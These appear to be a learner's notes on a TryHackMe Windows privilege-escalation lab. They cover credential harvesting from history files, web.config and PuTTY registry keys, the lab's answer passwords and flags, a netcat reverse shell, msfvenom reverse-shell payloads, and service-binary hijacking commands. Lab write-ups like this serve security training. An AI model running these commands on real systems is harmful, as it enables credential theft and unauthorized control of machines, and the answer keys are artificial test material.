
## Windows Privilege Escalation


**Built-In User Accounts** 

SYSTEM/LocalSystem - Account used by the operating system, greater privileges than the Administrators group. Can access all files and folders throughout the system. 

Local Service - Default account, minimum privileges. Uses anonymous connections over the network. 

Network Service - Default account with minimum privileges. Uses computer credentials to authenticate over the network. 
#### Questions

Users that can change system configurations are part of which group?
```
Administrators
```

The SYSTEM account has more privileges than the Administrator user (aye/nay)
```
aye
```

## Harvesting Passwords from Usual Spots

Unattended install xml files can have users credentials in them to run automated updates to windows. 
This are some locations that you may find them. 
```powershell
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
```

This command can be run within the cmd.exe program. 
This spits out the currently logged in users history of commands they entered. 
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```


This command will list out saved credentials of other users, if they have been saved. 
They can then be used to open a new cmd window as that user. 
```powershell
PS C:\Users\thm-unpriv> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```

```powershell
PS C:\Users\thm-unpriv> runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
```

IIS, the Windows web server may contain credentials in it's configuration file. 
The places to look for them are here: 
```powershell
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Putty, the ssh client application will sometimes store plain text passwords for proxy configurations. 
To display these plain text passwords, display the values in the registry key below. 
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


#### Questions

A password for the julia.jones user has been left on the Powershell history. What is the password?
```
PS C:\Users\thm-unpriv> type C:\Users\thm-unpriv\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z

ZuperCkretPa5z
```

A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
```
 notepad C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

 <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />

098n0x35skjD3
```

There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
```
PS C:\Users\thm-unpriv> runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...

cd C:\Users\mike.katz\Desktop
notepad flag.txt

THM{WHAT_IS_MY_PASSWORD}
```

Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
```
PS C:\Users\thm-unpriv> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.

CoolPass2021
```

## Other Quick Wins

#### Scheduled Tasks

If a user has permissions to configure or overwrite a task, they'll be able to execute arbitrary command on the machine. 

List out all scheduled tasks with  this command: 
```powershell
schtasks 
```

Query specific task by it's names and list out details of that task. 
In this case when executing the command in the windows shell on tryhackme the scheduled task is run as a different user but configurable by us. 
```powershell
schtasks /query /tn <task_name> /fo list /v
```

To check the permissions of a task, run the command below
```powershell
 icacls C:\tasks\
```


Running this command will use the nc64.exe application to open a reverseshell to the attacks computer when the scheduled task runs. 
This command must be run in cmd.exe
```
 echo C:\tools\nc64.exe -e cmd.exe 10.10.136.44 4444 > C:\tasks\schtask.bat
```

#### AlwaysInstallElevated

Windows Installation Files can be run as the user they're launched by or with higher privileges. If done with the latter, a user can elevate their privileges.

Set the registry keys
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Create a payload msi file with msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

The payload can then be executed on the victims machine. 
```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

#### Questions 

What is the taskusr1 flag?
```
THM{TASK_COMPLETED}
```

## Abusing Service Misconfigurations

#### Windows Services

Service Control Manager - Process in charge of managing windows services. 

Check a service's configuration. 
This command can be ran in the command prompt. 
```
sc qc <service_name>
```

Discretionary Access Control List (DACL) - states who has permissions to control the servic. 

#### Insecure Permissions on Service Executable

If you were to check another service that by chance has insecure permissions. 
Those being modify permissions by either the Everyone or Users group, you can elevate tour privileges to the the user who runs the service. 
More specifically you'll need to check the services executable file. 
```
icacls <path_to_executable>
```

You can create a malicious executable payload with msfvenom. 
Download that payload onto the target machine and replace the vulnerable file with the payload. 
Then configure the permissions of the new executable with permissions to be executed by anyone. 
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
```

```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files..
```


#### Unquoted Service Paths

Unquoted service paths can be manipulated to execute other services rather than the one specified in the command. 
This is because Windows doesn't take into account spaces in service name and will treat them as arguments firstly. 
It will query the first word in the service name first, then attempt to complete the rest. 

Most services under Program Files or Program Files (x86) can only be ran by a user from the Administrator group. 
Sometimes an Administrator may want to launch a service outside of these folders though. 
If the path is writable a user can elevate their privileges depending on what "run as" user is set. 
 
#### Insecure Service Permissions

If the service itself is configurable via insecure permissions by chance, the user can just replace that file with a payload. 
This is different compared to the other ways of elevating privileges. The others focused on configuring the executable file launched by a service. 

We can check the permissions of a service by utilizing the  application "AccessChk" by sys internals. 
You can then configure the permissions of the service file to follow the standards of service permissions. 
Giving permissions to everyone on the system to execute the file. 
Configure the service to point to the path of the executable. 
```
accesschk64.exe -qlc <service_name>
C:\> icacls C:\Users\thm-unpriv\<payload_name> /grant Everyone:F
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

#### Questions

Get the flag on svcusr1's desktop.
```
THM{AT_YOUR_SERVICE}
```

Get the flag on svcusr2's desktop.  
```
THM{QUOTES_EVERYWHERE}
```


Get the flag on the Administrator's desktop.
```
THM{INSECURE_SVC_CONFIG}
```

## Abusing dangerous privileges


#### SeBackup/SeRestore

#### SeTakeOwnership 

#### SeImpersonate / SeAssignPrimaryToken



## Abusing vulnerable software

## Tools of the Trade